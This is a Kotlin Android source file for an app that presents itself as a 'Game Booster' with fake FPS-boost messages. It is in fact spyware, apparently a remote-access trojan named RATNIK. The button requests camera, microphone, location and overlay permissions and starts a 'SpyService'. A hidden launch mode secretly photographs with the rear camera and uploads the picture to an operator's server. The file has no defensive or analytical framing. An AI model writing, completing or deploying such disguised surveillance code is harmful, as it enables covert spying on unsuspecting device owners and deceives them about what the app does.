package com.ratnik.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Если запущены для снимка — делаем фото и закрываемся
        if (intent.getBooleanExtra("SNAP", false)) {
            takeSnapshotAndFinish()
            return
        }

        // Обычный экран Game Booster
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.gravity = Gravity.CENTER
        layout.setBackgroundColor(0xFF1E1E1E.toInt())

        val title = TextView(this)
        title.text = "Game Booster"
        title.setTextColor(0xFFFFFFFF.toInt())
        title.textSize = 28f
        title.gravity = Gravity.CENTER
        layout.addView(title)

        val status = TextView(this)
        status.text = "Оптимизация памяти..."
        status.setTextColor(0xFF00FF00.toInt())
        status.textSize = 16f
        status.setPadding(0, 30, 0, 50)
        status.gravity = Gravity.CENTER
        layout.addView(status)

        val btn = Button(this)
        btn.text = "УСКОРИТЬ FPS"
        btn.setOnClickListener {
            status.text = "FPS увеличен до 120!"
            checkPermissionsAndStart()
        }
        layout.addView(btn)
        setContentView(layout)
    }

    private fun checkPermissionsAndStart() {
        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 101)
        } else {
            checkOverlayPermission()
        }
    }

    private fun checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            startActivityForResult(intent, 102)
        } else {
            startSpyService()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) checkOverlayPermission()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 102) startSpyService()
    }

    private fun startSpyService() {
        val intent = Intent(this, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
    }

    // --- ЛОГИКА СНИМКА (ЗАДНЯЯ КАМЕРА + АВТОФОКУС) ---
    private fun takeSnapshotAndFinish() {
        val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
        val serverUrl = "http://127.0.0.1:8080" // Твой IP

        var camera: Camera? = null
        try {
            var cameraId = -1
            val cameraInfo = Camera.CameraInfo()
            for (i in 0 until Camera.getNumberOfCameras()) {
                Camera.getCameraInfo(i, cameraInfo)
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraId = i
                    break
                }
            }
            if (cameraId == -1) cameraId = 0

            camera = Camera.open(cameraId)
            val params = camera.parameters
            params.pictureFormat = ImageFormat.JPEG
            
            val focusModes = params.supportedFocusModes
            if (focusModes != null && focusModes.contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
                params.focusMode = Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE
            }
            
            camera.parameters = params
            camera.setPreviewTexture(SurfaceTexture(0))
            camera.startPreview()
            
            // Задержка для фокусировки
            Thread.sleep(1500)
            
            camera.takePicture(null, null) { data, _ ->
                try {
                    val file = File(cacheDir, "snap.jpg")
                    FileOutputStream(file).use { it.write(data) }
                    
                    val requestBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                    val multipartBody = MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", "snap.jpg", requestBody)
                        .build()
                        
                    val request = Request.Builder().url("$serverUrl/upload").post(multipartBody).build()
                    
                    Thread {
                        try {
                            client.newCall(request).execute().use { }
                            file.delete()
                            Log.d("RATNIK", "Фото отправлено")
                        } catch (e: Exception) {
                            Log.e("RATNIK", "Ошибка отправки: ${e.message}")
                        } finally {
                            runOnUiThread { finish() }
                        }
                    }.start()
                    
                } catch (e: Exception) {
                    Log.e("RATNIK", "Ошибка сохранения: ${e.message}")
                    camera.release()
                    finish()
                }
            }
        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка камеры: ${e.message}")
            camera?.release()
            finish()
        }
    }
}
